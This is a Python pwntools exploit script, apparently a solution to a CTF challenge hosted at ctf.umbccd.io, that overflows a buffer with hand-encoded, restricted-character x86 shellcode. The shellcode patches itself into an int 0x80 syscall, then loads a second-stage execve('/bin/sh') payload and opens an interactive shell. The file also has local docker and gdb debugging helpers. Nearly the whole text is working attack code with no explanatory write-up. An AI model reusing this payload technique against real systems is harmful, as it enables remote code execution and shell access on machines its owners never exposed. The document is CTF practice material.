#Written by pernicious

from pwn import *

if 'rem' in sys.argv:
    r = remote("ctf.umbccd.io",4800)
else:
    if '-d' in sys.argv:
        os.system("docker exec ub18 pkill -9 gdb")
    os.system("docker exec ub18 pkill -9 chall")
    r = remote("0", 1338)
    if '-d' in sys.argv:
        os.system("docker exec ub18 pidof chall > /tmp/ddd")
        pid = int(open("/tmp/ddd","r").read().split(' ')[0])
        script = '''
        b *0x080493df
        c
        '''
        open("/tmp/script.gdb","w").write(script)
        os.system("docker cp /tmp/script.gdb ub18:/tmp/script.gdb")
        run_in_new_terminal("docker exec -it ub18 gdb -q /chall %d -x /tmp/script.gdb"%pid)
        pid = pidof("chall").next()
        proc.wait_for_debugger(pid)

pl = "AB"*(76/4-3)
pl += "A"*10+"B"
pl += "T"+"P"
pl += "A"+"B"*2
pl += "S"+"P"*10
pl += "AB"*(194/4-1)
pl += "A"+"B"*10

#xor [edi], bh
sc = "?"*6
# push eax; pop edx
sc += "P"*6+"Z"*6
# push 0x31; pop eax; xor al, 0x31
sc += "j"+"X"*41
# push eax; pop ebx; dec ebx
sc += "P"*6+"["*6+"K"*60
# xor [edi], bh; dec edi; xor [edi], bh
sc += "?"*6+"O"*60+"?"*6
# push eax; pop ebx
sc += "P"*6+"["*6
# push edi; pop ecx
sc += "W"*6+"Y"*6
# push ebx; pop eax; inc eax; inc esi; inc eax; inc esi; inc eax
sc += "S"*6+"X"*6+"@"*6+"F"*6+"@"*6+"F"*6+"@"*6
# nops: inc esi; dec esi...
sc += ("F"*6+"N"*6)*50
# place value that gets xored to be 0x80cd
sc += "<"*16+"N"*6+"F"*2
sc += "N"

pl += sc

print pl

r.sendafter("today?\n", pl+'\n')

r.send("AA"+asm(shellcraft.execve("/bin/sh",0,0)))

r.interactive()
